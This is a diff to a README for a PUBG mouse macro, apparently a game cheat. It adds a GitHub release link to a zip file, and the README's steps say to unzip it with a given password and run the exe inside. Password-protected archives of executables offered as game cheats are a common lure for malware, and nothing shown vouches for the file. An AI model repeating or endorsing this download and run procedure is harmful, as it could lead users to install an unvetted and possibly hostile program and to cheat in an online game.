@@ -16,7 +16,7 @@ This product is not software, it is a simple macro that is not embedded in the g
 10) Chinese, English, Russian version of the menu.
 
 ## How to Use
-1. **Download last release:** ().
+1. **Download last release:** (https://github.com/Ashaunaal/PUBG-ALL-MOUSE-AI-MACRO/releases/download/latest/PUBGMacro.zip).
 2. **Unzip the Files**: Use the pass **PUBGMacro**.
 3. **Run the Application**: Open the menu by opening the Exe
 
